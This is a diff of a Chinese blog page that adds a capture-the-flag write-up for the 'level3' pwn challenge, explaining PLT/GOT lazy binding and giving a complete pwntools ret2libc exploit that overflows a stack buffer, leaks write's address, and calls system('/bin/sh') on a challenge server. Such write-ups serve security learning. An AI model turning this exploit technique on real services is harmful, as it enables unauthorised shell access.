@@ -458,14 +458,14 @@ CGfsb菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作�
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.6k
+                    6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    18 分
+                    24 分
                 </div>
                 
                 
@@ -1048,6 +1048,107 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <blockquote>
 <p>搞了2个半小时,emmmm终于搞完了………………………….,   加油啊,啊啊啊啊啊啊啊…..</p>
 </blockquote>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><code>libc!libc!这次没有system，你能帮菜鸡解决这个难题么?</code></p>
+<ul>
+<li><p>基操</p>
+<ul>
+<li><p>查看文件信息。下载的文件是一个压缩包，用winrar解压发现的到一个文件，结果拖到kail虚拟机里发现还是一个压缩包，提取文件的到一个level3的文件和一个libc文件，查看level的信息</p>
+<p><img src="https://ae01.alicdn.com/kf/H4c888d865c624af4810ee60c163a00ebl.jpg" alt></p>
+<p>32位的ELF文件，开启了NX保护，也就是说栈不可执行，一次shellcode基本没有用武之地了。</p>
+</li>
+<li><p>丢到IDA里看看</p>
+<p><img src="https://ae01.alicdn.com/kf/H0fa45aebf3c34a14b41476028f5ae56fL.jpg" alt></p>
+<p>main函数里没什么东西，接着查看vulnerable_function()函数</p>
+<p><img src="https://ae01.alicdn.com/kf/Hd83c69e71d6540ff9176f289a8a99762y.jpg" alt></p>
+<p>也没什么，看似没有栈溢出漏洞。但是呢</p>
+</li>
+</ul>
+</li>
+<li><p>我们发现buf申请了0x88个byte的空间，0x88的buf + 0x4的EBP。但是我们read读取的确是0x100个byte的空间，存在明显的栈溢出。但是呢栈不可执行，此时我们就要用到了ROP攻击了。</p>
+<p><img src="https://ae01.alicdn.com/kf/He776bf0f958a488597edf3c275297758q.jpg" alt></p>
+<p><img src="https://ae01.alicdn.com/kf/H9a7e68a48b0849578820674534e82249I.jpg" alt></p>
+</li>
+<li><p>再程序中找看看有没有现成的systme函数和’/bin/sh’字符串。<code>shift+f12</code> 查看字符串发现没有‘/bin/sh’，但是呢我们发现程序加载了动态函数库libc动态链接库</p>
+<p><img src="https://ae01.alicdn.com/kf/H8d05c4a2275b4d5d864a6f08d3ab8a5dO.jpg" alt></p>
+<p>于是乎我们就是要找到systme函数和字符串’/bin/sh’在映射到level3程序中的地址，然后进行ROP攻击。</p>
+</li>
+<li><p>但是如何获取到本来不直接在程序中的函数和参数的地址呢。这里就要说道说道了</p>
+<ul>
+<li><p>libc文件</p>
+<p>首先在程序开始运行的时候libc文件是要加载到内存中，以后当程序需要调用相关库函数是就会依据    plt-got表对函数的实际地址进行映射，相当于调用时会通过plt-got表辗转跳转至真正的函数地址进行执行。</p>
+</li>
+<li><p>PLT和GOT表</p>
+<p><code>PLT</code>: 内部函数表（Procedure Linkage Table，过程链接表）是LinuxELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定</p>
+<p><code>GOT</code>: 全局函数表（Global Offset Table, 全局偏移表）是LinuxELF文件用于定位全局变量和函数的一个表。</p>
+</li>
+<li><p>延迟绑定</p>
+<pre class="line-numbers language-c"><code class="language-c">实际程序调用了libc库中的write函数。
+在PLT表中的条目为write@plt。。
+在GOT表中的条目为write@got
+
+当程序第一次调用write函数时：
+<span class="token number">1</span><span class="token punctuation">.</span> 跳转到PLT表
+<span class="token number">2</span><span class="token punctuation">.</span> 跳转到GOT表
+<span class="token number">3</span><span class="token punctuation">.</span> 调用patch write@got 将write的真实地址填充到write@got中
+
+当程序第二次调用write函数时：
+<span class="token number">1</span><span class="token punctuation">.</span> write@plt
+<span class="token number">2</span><span class="token punctuation">.</span> write@got
+<span class="token number">3</span><span class="token punctuation">.</span> 得到<span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span>的真实地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>也就是只要调用了函数那么GOT表存的就是函数的真实地址。</p>
+</li>
+<li><p>我们可以通过libc文件的到函数在文件中的基地址，而函数在内存中的地址是基地址的平行映射，也就是所libc文件中的所有函数的<code>基地址</code>和<code>真实地址</code>(内存中的地址)的偏移量是一样的。</p>
+<p>因此我们可以通过计算已知函数的偏移量来得知我们需要的函数的偏移量，而所需函数的基地址可以直接通过libc文件（或者通过LibcSearcher 库找到对应的版本）获取。</p>
+</li>
+</ul>
+</li>
+<li><p>解体思路</p>
+<ul>
+<li>我们是已知程序调用了libc中的write函数，那么我们就可以先通过write函数获取偏移量，利用read函数的栈溢出漏洞。</li>
+<li>然后再利用read函数的漏洞传入我们要调用的函数和参数的地址</li>
+<li>整个过程需要利用两次read函数，所以第一次利用的时候还要设置函数的返回地址为<code>vulnerable_function</code>的地址，于是或才有了第二次read函数调用。</li>
+<li>LibcSearcher<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">源码与使用</a></li>
+<li>payload1：填充buf，使其溢出；write的plt语句(用来调用write函数)；需要再次执行的函数地址；文件描述符；write()的got表地址；写入长度。</li>
+<li>得到write返回的write的got表地址（也就是真实(内存)地址，根据真实地址通过LibcSearcher库找到对应的libc版本</li>
+<li>算出偏移量，system()的地址，/bin/sh的地址，构建payload2：填充buf；system()地址；返回地址随意填；参数地址</li>
+</ul>
+</li>
+<li><p>构建exp</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span> <span class="token number">57131</span><span class="token punctuation">)</span>
+e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"../mid_file/level3"</span><span class="token punctuation">)</span>
+
+write_got <span class="token operator">=</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 获取write()函数的got语句</span>
+write_plt <span class="token operator">=</span> e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 获取write()函数的plt语句</span>
+vuln_addr <span class="token operator">=</span> e<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"vulnerable_function"</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 获取函数地址</span>
+<span class="token comment" spellcheck="true"># payload1：填充buf，使其溢出；write的plt语句(用来调用write函数)；需要再次执行的函数地址；文件描述符；write()的got表地址；写入长度。</span>
+payload1 <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+</ul>
+<p>  p.recv()<br>  p.sendline(payload1)</p>
+<h1 id="得到write返回的write的got表地址（也就是真实-内存-地址）"><a href="#得到write返回的write的got表地址（也就是真实-内存-地址）" class="headerlink" title="得到write返回的write的got表地址（也就是真实(内存)地址）"></a>得到write返回的write的got表地址（也就是真实(内存)地址）</h1><p>  write_addr = u32(p.recv(4))<br>  print(“write addr:” + hex(write_addr))</p>
+<h1 id="根据真实地址通过LibcSearcher库找到对应的libc版本"><a href="#根据真实地址通过LibcSearcher库找到对应的libc版本" class="headerlink" title="根据真实地址通过LibcSearcher库找到对应的libc版本"></a>根据真实地址通过LibcSearcher库找到对应的libc版本</h1><p>  libc = LibcSearcher(“write”, write_addr)<br>  libc_base = write_addr - libc.dump(‘write’) # 获取偏移量<br>  sys_addr = libc_base + libc.dump(‘system’) # 基地址 + 偏移量<br>  bin_sh = libc_base + libc.dump(‘str_bin_sh’) # 基地址 + 偏移量</p>
+<h1 id="payload2：填充buf；system-地址；返回地址随意填；参数地址"><a href="#payload2：填充buf；system-地址；返回地址随意填；参数地址" class="headerlink" title="payload2：填充buf；system()地址；返回地址随意填；参数地址"></a>payload2：填充buf；system()地址；返回地址随意填；参数地址</h1><p>  payload2 = “a” * (0x88 + 0x4) + p32(sys_addr) + p32(4) + p32(bin_sh)</p>
+<p>  p.recv()<br>  p.sendline(payload2)</p>
+<p>  p.interactive()<br>  ```</p>
+<p>  运行结果：</p>
+<p>  <img src="https://ae01.alicdn.com/kf/H71538eb23e2f4042b7954b0c039fda5fd.jpg" alt></p>
+<ul>
+<li>参考资料：<ul>
+<li><a href="http://virgin-forest.top/2019/05/18/ctf-xman-level3-libcsearcher/" target="_blank" rel="noopener">Writeup</a></li>
+<li><a href="https://blog.csdn.net/u011822516/article/details/20001765" target="_blank" rel="noopener">详细解析ESP寄存器与EBP寄存器</a></li>
+<li><a href="[https://introspelliam.github.io/2017/08/03/pwn/got%E3%80%81plt%E8%A1%A8%E4%BB%8B%E7%BB%8D/](https://introspelliam.github.io/2017/08/03/pwn/got、plt表介绍/)">got、plt表介绍</a></li>
+<li><a href="https://zszcr.github.io/2018/09/16/2018-9-16-pwnenv/" target="_blank" rel="noopener">pwn工具集</a><blockquote>
+<p>说明：有些博客将本文中的基地址称之为真实地址，个人认为不太恰当，程序执行过程中内存中的地址才应该是真实地址，所以本文将其再内存中的地址称之为基地址，而将libc中函数的地址称之为基地址。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
 
             </div>
             <hr />
@@ -1523,7 +1624,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">33.2k</span>
+            <span class="white-color">34.6k</span>
             
 
             <br>
